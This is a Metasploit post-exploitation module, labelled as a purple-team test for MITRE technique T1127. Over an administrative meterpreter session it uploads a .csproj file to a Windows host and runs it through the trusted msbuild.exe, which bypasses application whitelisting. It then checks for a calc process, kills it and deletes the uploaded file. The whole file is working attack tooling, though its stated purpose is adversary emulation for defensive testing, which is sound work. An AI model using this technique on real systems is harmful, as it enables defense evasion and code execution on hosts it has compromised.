##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Purple

  def initialize(info={})
    super(update_info(info,
                      'Name'          => 'Trusted Developer Utilities (T1127) Windows - Purple Team',
                      'Description'   => %q{
                        Defense Evasion, Execution:
                        There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering. These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application whitelisting defensive solutions.},
                      'License'       => MSF_LICENSE,
                      'Author'        => [ 'Praetorian' ],
                      'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1127' ],
                      [ 'URL', 'https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1127' ],
                      [ 'URL', 'https://gist.github.com/ConsciousHacker/5fce0343f29085cd9fba466974e43f17' ] ],
                      'Platform'      => [ 'win' ],
                      'SessionTypes'  => [ 'meterpreter' ]
                     ))
    register_options(
    [
      OptString.new( 'RFILE', [false, 'Remote path of the HTA that we will write.','C:\\t1127.txt' ]),
      OptInt.new('ARCH', [false, 'Architecture (1=x86,2=x64)', 1 ]),
      OptString.new('LFILE', [ true, 'Local path of the file to upload.', ::File.join(Msf::Config.install_root, "data", "purple", "t1127", "t1127.csproj")]),
      OptBool.new('CLEANUP_FILE', [ false, "Clean-up file", true]),
      OptString.new('DOTNET_VERSION', [true, 'DotNet Version','v4.0.30319' ]),
    ])
  end

  def remote_file
    if datastore['RFILE'].blank?
      remote_name = File.basename(datastore['LFILE'])
    else
      remote_name = datastore['RFILE']
    end
    remote_name
  end

  def local_file
    datastore['LFILE']
  end


  def run_msbuild
    rfile = remote_file()
    lfile = local_file()
    dotnet_version = datastore['DOTNET_VERSION']
    arch = datastore['ARCH']

    if arch == 1
      base = 'C:\Windows\Microsoft.NET\Framework'
    else
      base = 'C:\Windows\Microsoft.NET\Framework64'
    end
    msbuild = base + '\\' + dotnet_version + '\\' + 'msbuild.exe'
    print_status("Uploading #{lfile} to #{rfile}")

    upload_file(rfile, lfile)

    select(nil,nil,nil,2)

    cmd = %Q(#{msbuild} #{rfile})
    print_status("Executing msbuild...")
    run_cmd(cmd,false)
    select(nil,nil,nil,1)

    sleep(2)

    print_status("Checking for calc")
    kill_calc(true)

    if datastore['CLEANUP_FILE']
      print_status("Removing file...")
      rm_f(rfile)
    end
  end

  def run
    begin
      return 0 if session.type != "meterpreter"

      unless is_admin?
        fail_with(Failure::NoAccess, "The current session does not have administrative rights.")
      end

      run_msbuild()

      print_good("Module T1127W execution successful.")

    rescue ::Exception => e
      print_error("#{e.class}: #{e.message}")
      print_error("Module T1175W execution failed.")
      return
    end
  end
end
